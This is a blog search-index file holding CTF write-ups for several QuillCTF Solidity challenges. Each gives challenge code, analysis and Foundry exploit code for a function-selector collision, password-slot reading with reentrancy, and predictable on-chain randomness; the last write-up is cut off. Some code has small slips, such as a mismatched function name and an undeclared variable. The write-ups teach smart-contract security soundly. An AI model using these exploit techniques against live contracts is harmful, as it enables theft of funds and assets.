<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>QuillCTF-Summary</title>
      <link href="/2024/01/23/QuillCTF-Summary/"/>
      <url>/2024/01/23/QuillCTF-Summary/</url>
      
        <content type="html"><![CDATA[<h1 id="WHAT-I-LEARN-FROM-QUILLCTF"><a href="#WHAT-I-LEARN-FROM-QUILLCTF" class="headerlink" title="WHAT I LEARN FROM QUILLCTF"></a>WHAT I LEARN FROM QUILLCTF</h1><h1 id="5-D31eg4t3"><a href="#5-D31eg4t3" class="headerlink" title="5-D31eg4t3"></a>5-D31eg4t3</h1><ol><li>Basic storage.</li></ol><h1 id="8-Pelusa"><a href="#8-Pelusa" class="headerlink" title="8-Pelusa"></a>8-Pelusa</h1><ol><li>The contract codesize is set only at the end of constructor. so it can pass the vertify like <code>msg.sender.code.length == 0</code></li><li>Use create2 to create the address.</li></ol><h1 id="19-Predictable-nft"><a href="#19-Predictable-nft" class="headerlink" title="19-Predictable-nft"></a>19-Predictable-nft</h1><ol><li>Use <code>createSelectFork</code> cheatcode on Foundry to create a new fork.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function setUp() public &#123;</span><br><span class="line">       vm.createSelectFork(&quot;https://eth-goerli.g.alchemy.com/v2/api_key&quot;);</span><br><span class="line">       vm.deal(hacker, 1 ether);</span><br><span class="line">       nft = INFT(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-Last 14 Challenges</title>
      <link href="/2024/01/23/QuillCTF-Last-14-Challenges/"/>
      <url>/2024/01/23/QuillCTF-Last-14-Challenges/</url>
      
        <content type="html"><![CDATA[<h1 id="13-Donate"><a href="#13-Donate" class="headerlink" title="13-Donate"></a>13-Donate</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hey, why not become the Keeper of the Donation? 😉</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Initially, you are a hacker. Not the owner or the keeper of Donate contract. The purpose is to call <code>keeperCheck()</code> Function and get true;</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8;</span><br><span class="line"></span><br><span class="line">contract Donate &#123;</span><br><span class="line">    event t1(bytes _sig);</span><br><span class="line">    address payable public keeper;</span><br><span class="line">    address public owner;</span><br><span class="line">    event newDonate(address indexed, uint amount);</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner || msg.sender == address(this),</span><br><span class="line">            &quot;You are not Owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _keeper) &#123;</span><br><span class="line">        keeper = payable(_keeper);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pay() external payable &#123;</span><br><span class="line">        keeper.transfer(msg.value);</span><br><span class="line">        emit newDonate(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeKeeper(address _newKeeper) external onlyOwner &#123;</span><br><span class="line">        keeper = payable(_newKeeper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function secretFunction(string memory f) external &#123;</span><br><span class="line">        require(</span><br><span class="line">            keccak256(bytes(f)) !=</span><br><span class="line">                0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428,</span><br><span class="line">            &quot;invalid&quot;</span><br><span class="line">        );</span><br><span class="line">        (bool success, ) = address(this).call(</span><br><span class="line">            abi.encodeWithSignature(f, msg.sender)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;call fail&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function keeperCheck() external view returns (bool) &#123;</span><br><span class="line">        return (msg.sender == keeper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>To call <code>keeperCheck()</code> and make it return ture, we need to be the keeper .</p><p>we can see the <code>changeKeeper()</code> is onlyOwner , so we need to find another way.</p><p>In <code>secretFunction()</code> the require</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(keccak256(bytes(f)) !=  0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428,&quot;invalid&quot;);</span><br></pre></td></tr></table></figure><p>&#x3D;&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428 = changeKeeper(address)</span><br></pre></td></tr></table></figure><p>Does it really prevent us from calling <code>changeKeeper()</code>? Not really.</p><p>We all know that functions are called based on function selector, which is just the first 4 bytes of the keccak256 of its signature. That is, we can call some random function signature to trigger a call to <code>changeKeeper()</code>, as long as their function selectors match.</p><p>To find a suitable function name with same function selector as <code>changeKeeper()</code> -&gt; <code>0x09779838</code>, I used Database:<br>![[Pasted image 20240130140521.png]]</p><p>we find the <code>refundETH()</code>.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Donate/Donate.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract donateHack is Test &#123;</span><br><span class="line">    Donate donate;</span><br><span class="line">    address keeper = makeAddr(&quot;keeper&quot;);</span><br><span class="line">    address owner = makeAddr(&quot;owner&quot;);</span><br><span class="line">    address hacker = makeAddr(&quot;hacker&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.prank(owner);</span><br><span class="line">        donate = new Donate(keeper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testhack() public &#123;</span><br><span class="line">        vm.startPrank(hacker);</span><br><span class="line">        // Hack Time</span><br><span class="line">        console.log(address(donate.keeper()));</span><br><span class="line">        donate.secretFunction(&quot;refundETHAll(address)&quot;);</span><br><span class="line">        console.log(address(donate.keeper()));</span><br><span class="line">        console.log(address(hacker));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="16-Gold-NFT"><a href="#16-Gold-NFT" class="headerlink" title="16-Gold-NFT"></a>16-Gold-NFT</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are a magician, Just wave your wand and magically bypass the password required to mint these NFTs.</span><br></pre></td></tr></table></figure><h2 id="Objective-1"><a href="#Objective-1" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Retrieve the password from IPassManager and mint at least 10 NFTs.</li></ul><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;ERC721&#125; from &quot;lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IPassManager &#123;</span><br><span class="line">    function read(bytes32) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GoldNFT is ERC721(&quot;GoldNFT&quot;, &quot;GoldNFT&quot;) &#123;</span><br><span class="line">    uint lastTokenId;</span><br><span class="line">    bool minted;</span><br><span class="line"></span><br><span class="line">    function takeONEnft(bytes32 password) external &#123;</span><br><span class="line">        require(</span><br><span class="line">            IPassManager(0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2).read(</span><br><span class="line">                password</span><br><span class="line">            ),</span><br><span class="line">            &quot;wrong pass&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (!minted) &#123;</span><br><span class="line">            lastTokenId++;</span><br><span class="line">            _safeMint(msg.sender, lastTokenId);</span><br><span class="line">            minted = true;</span><br><span class="line">        &#125; else revert(&quot;already minted&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation-1"><a href="#Observation-1" class="headerlink" title="Observation"></a>Observation</h2><p>The contract will call <code>read()</code> on <code>0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2</code> in goerli.</p><p>If we decompile it we will find it just taking that password as the storage slot and read a boolean from that slot.</p><p>On the contract creation transaction, we can see that the storage slot <code>0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe</code> is changed to <code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p><p>So we can just set our password to <code>0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe</code></p><p>Because it have a <code>if (!minted)</code> check , we need use reentrancy to attack it .</p><h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;ERC721&#125; from &quot;lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line">import &quot;./GoldNFT.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract HackGoldNft &#123;</span><br><span class="line">    uint256 i;</span><br><span class="line"></span><br><span class="line">    function exploit(address addr) external &#123;</span><br><span class="line">        GoldNFT(addr).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);</span><br><span class="line">        for (uint256 id = 1; id &lt; 11; ++id) &#123;</span><br><span class="line">            GoldNFT(addr).transferFrom(address(this), msg.sender, id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) &#123;</span><br><span class="line">        i += 1;</span><br><span class="line">        if (i &lt; 11) &#123;</span><br><span class="line">            GoldNFT(msg.sender).takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);</span><br><span class="line">        &#125;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/GoldNFT/GoldNFT.sol&quot;;</span><br><span class="line">import &quot;../src/GoldNFT/HackGoldNft.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Hack is Test &#123;</span><br><span class="line">    GoldNFT nft;</span><br><span class="line">    HackGoldNft nftHack;</span><br><span class="line">    address owner = makeAddr(&quot;owner&quot;);</span><br><span class="line">    address hacker = makeAddr(&quot;hacker&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() external &#123;</span><br><span class="line">        vm.createSelectFork(&quot;goerli&quot;, 8591866);</span><br><span class="line">        nft = new GoldNFT();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Attack() public &#123;</span><br><span class="line">        vm.startPrank(hacker);</span><br><span class="line">        // solution</span><br><span class="line">        exp = new HackGoldNft();</span><br><span class="line">        exp.exploit(address(nft));</span><br><span class="line">        assertEq(nft.balanceOf(hacker), 10);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="19-Predictable-nft"><a href="#19-Predictable-nft" class="headerlink" title="19-Predictable-nft"></a>19-Predictable-nft</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Generating random numbers was difficult before the Oracles. People had to simulate randomness using built-in variables like `sha3(block.number)`.</span><br></pre></td></tr></table></figure><h2 id="Objective-2"><a href="#Objective-2" class="headerlink" title="Objective"></a>Objective</h2><ul><li>In this game, you can spend 1 ether to “mint” an NFT token with 3 possible ranks: Common(1), Rare(2), and Superior(3). As a hacker, your goal is to always mint the Superior ones.</li></ul><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><p>its only give the address on the goerli , we need decompile it .</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC</span><br></pre></td></tr></table></figure><p>dedaub:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// Decompiled by library.dedaub.com</span><br><span class="line">// 2024.01.09 05:53 UTC</span><br><span class="line">// Compiled using the solidity compiler version 0.8.19</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Data structures and variables inferred from the use of storage instructions</span><br><span class="line">uint256 _id; // STORAGE[0x0]</span><br><span class="line">mapping (uint256 =&gt; uint256) _tokens; // STORAGE[0x1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function function_selector() public payable &#123; </span><br><span class="line">    revert();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function mint() public payable &#123; </span><br><span class="line">    require(10 ** 18 == msg.value, Error(&#x27;show me the money&#x27;));</span><br><span class="line">    require(_id &lt;= 1 + _id, Panic(17)); // arithmetic overflow or underflow</span><br><span class="line">    _id += 1;</span><br><span class="line">    require(100, Panic(18)); // division by zero</span><br><span class="line">    if (keccak256(_id, msg.sender, block.number) % 100 &lt;= 90) &#123;</span><br><span class="line">        if (keccak256(_id, msg.sender, block.number) % 100 &lt;= 80) &#123;</span><br><span class="line">            v0 = v1 = 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            v0 = v2 = 2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        v0 = v3 = 3;</span><br><span class="line">    &#125;</span><br><span class="line">    _tokens[_id] = v0;</span><br><span class="line">    return _id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function tokens(uint256 varg0) public nonPayable &#123; </span><br><span class="line">    require(msg.data.length - 4 &gt;= 32);</span><br><span class="line">    return _tokens[varg0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function id() public nonPayable &#123; </span><br><span class="line">    return _id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Note: The function selector is not present in the original solidity code.</span><br><span class="line">// However, we display it for the sake of completeness.</span><br><span class="line"></span><br><span class="line">function function_selector( function_selector) public payable &#123; </span><br><span class="line">    MEM[64] = 128;</span><br><span class="line">    if (msg.data.length &gt;= 4) &#123;</span><br><span class="line">        if (0x1249c58b == function_selector &gt;&gt; 224) &#123;</span><br><span class="line">            mint();</span><br><span class="line">        &#125; else if (0x4f64b2be == function_selector &gt;&gt; 224) &#123;</span><br><span class="line">            tokens(uint256);</span><br><span class="line">        &#125; else if (0xaf640d0f == function_selector &gt;&gt; 224) &#123;</span><br><span class="line">            id();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fallback();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation-2"><a href="#Observation-2" class="headerlink" title="Observation"></a>Observation</h2><p>Our objective is to always mint the superior ones . which means to mint type 3 NFTs.</p><p>Our main focus is the <code>mint()</code> fn. The first <code>if</code> statement checks wether <code>uint256</code> of <code>keccak256</code> of hash <code>_id, msg.sender, block.number</code> parameters has the last <code>2</code> digits are less than or equal to <code>90</code> if so then it checks if it’s less than or equal to <code>80</code> or not. If so then mint type <code>1</code> else mint type <code>2</code> or if none of those mint <code>3</code>. So we have to check if the unsigned int has the last 2 digits greater than <code>90</code>, only then we can mint type <code>3</code> NFTs.</p><h2 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.19;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/INFT.sol&quot;;</span><br><span class="line">import &quot;forge-std/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface INFT &#123;</span><br><span class="line">    function mint() external payable;</span><br><span class="line">    function tokens(uint256 _id) external view returns (uint256);</span><br><span class="line">    function id() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PredictableNFTTest is Test &#123;</span><br><span class="line">    INFT nft;</span><br><span class="line">    address hacker = address(0x1337);</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(</span><br><span class="line">            &quot;https://goerli.infura.io/v3/&lt;api_key&gt;&quot;</span><br><span class="line">        );</span><br><span class="line">        vm.deal(hacker, 1 ether);</span><br><span class="line">        nft = INFT(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);</span><br><span class="line">    &#125;</span><br><span class="line">    function test() public &#123;</span><br><span class="line">        vm.startPrank(hacker);</span><br><span class="line">        uint mintedId;</span><br><span class="line">        uint currentBlockNum = block.number;</span><br><span class="line">        // console.log(msg.sender);</span><br><span class="line">        // console.log(address(hacker));</span><br><span class="line">        mintedId = nft.id();</span><br><span class="line">        // console.log(mintedId);</span><br><span class="line">        // Mint a Superior one, and do it within the next 100 blocks.</span><br><span class="line">        for (uint i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">            vm.roll(currentBlockNum);</span><br><span class="line">            // ---- hacking time ----</span><br><span class="line">            uint256 jadu = uint256(</span><br><span class="line">                keccak256(</span><br><span class="line">                    abi.encode(mintedId + 1, address(hacker), block.number)</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">            if (jadu % 100 &gt; 90) &#123;</span><br><span class="line">                nft.mint&#123;value: 1 ether&#125;();</span><br><span class="line">                console.log(&quot;Minted ID: &quot;, nft.id());</span><br><span class="line">                console.log(&quot;Minted Rank: &quot;, nft.tokens(nft.id()));</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            currentBlockNum++;</span><br><span class="line">        &#125;</span><br><span class="line">        mintedId = nft.id();</span><br><span class="line">        uint mintedRank = nft.tokens(mintedId);</span><br><span class="line">        assertEq(mintedRank, 3, &quot;not Superior(rank != 3)&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Why use abi.encode?<br> That’s because <code>abi.encodePacked</code> does’t add any padding &amp; if 2 dynamic data types are together then it can lead to <code>hash collision</code> to high probability the original contract haven’t used this.</p><h1 id="20-VotingMachine"><a href="#20-VotingMachine" class="headerlink" title="20-VotingMachine"></a>20-VotingMachine</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vToken is a governance token that allows holders to vote on proposals for the community. As a hacker, you have proposed a malicious proposal and now you need 3000 votes to get it accepted in your favor.</span><br></pre></td></tr></table></figure><h2 id="Objective-3"><a href="#Objective-3" class="headerlink" title="Objective"></a>Objective</h2><ul><li><p>Accumulate at least 3000 votes in your hacker address. You don’t have any tokens in your wallet.</p></li><li><p>After trying all attempts and failing, you decided to perform a phishing attack and you successfully obtained the private keys from three users: Alice , Bob, and Carl.</p></li><li><p>Fortunately, Alice had 1000 vTokens, but Bob and Carl don’t have any tokens in their accounts. (see foundry setUp)</p></li><li><p>Now that you have access to the private keys of Alice, Bob, and Carl’s accounts. So, try again.</p></li></ul><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.12;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract VoteToken is ERC20(&quot;Vote Token&quot;, &quot;vToken&quot;) &#123;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(owner == msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _to, uint256 _amount) public onlyOwner &#123;</span><br><span class="line">        _mint(_to, _amount);</span><br><span class="line">        _moveDelegates(address(0), _delegates[_to], _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address _from, uint256 _amount) public onlyOwner &#123;</span><br><span class="line">        _burn(_from, _amount);</span><br><span class="line">        _moveDelegates(_delegates[_from], address(0), _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; address) internal _delegates;</span><br><span class="line"></span><br><span class="line">    struct 